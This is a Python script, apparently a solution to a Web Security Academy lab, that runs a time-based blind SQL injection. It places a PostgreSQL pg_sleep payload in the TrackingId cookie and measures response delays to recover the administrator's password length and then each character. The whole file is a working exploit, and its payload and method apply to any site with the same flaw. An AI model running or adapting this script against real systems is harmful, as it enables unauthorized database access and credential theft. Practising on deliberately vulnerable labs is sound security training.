import requests
import string
import time

HOST = "0ac300ca046ebd998162d93800310069.web-security-academy.net"
SESSION = "LVPKFGhVbc1GTeKjC8HCKZtx1mSHV2T9"
TRACKING_ID = "bOyzPOEj3EFVUj98"
SLEEP_SECONDS = 3
THRESHOLD = 2.5  # cavab bu saniyeden artiq gelersa TRUE hesab edilir
CHARS = string.ascii_lowercase + string.digits

def check_condition(condition):
    """Condition TRUE-dursa server ~3 saniye gecikmeli cavab verir."""
    payload = f"{TRACKING_ID}'||(SELECT CASE WHEN ({condition}) THEN pg_sleep({SLEEP_SECONDS}) ELSE pg_sleep(0) END)--"
    cookies = {
        "TrackingId": payload,
        "session": SESSION
    }
    start = time.time()
    try:
        requests.get(f"https://{HOST}/", cookies=cookies, timeout=15)
    except requests.exceptions.Timeout:
        return True  # timeout = kesinlikle sleep isledi
    elapsed = time.time() - start
    return elapsed >= THRESHOLD

# --- Sifrenin uzunlugunu tap ---
print("[*] Sifrenin uzunlugu tapilir...")
password_length = 0
for length in range(1, 40):
    cond = f"(SELECT LENGTH(password) FROM users WHERE username='administrator')={length}"
    if check_condition(cond):
        password_length = length
        print(f"[+] Sifre uzunlugu: {length}")
        break

if not password_length:
    print("[-] Uzunluq tapilmadi!")
    exit(1)

# --- Sifrani herfi-herfe tap ---
print(f"[*] Sifre tapilir ({password_length} herf)...")
password = ""
for pos in range(1, password_length + 1):
    for char in CHARS:
        cond = f"(SELECT SUBSTRING(password,{pos},1) FROM users WHERE username='administrator')='{char}'"
        if check_condition(cond):
            password += char
            print(f"[+] Pozisiya {pos:2d}: {char}  |  Indiye qeder: {password}")
            break
    else:
        print(f"[-] Pozisiya {pos}-de herf tapilmadi!")

print(f"\n[*] ADMINISTRATOR SIFRESI: {password}")
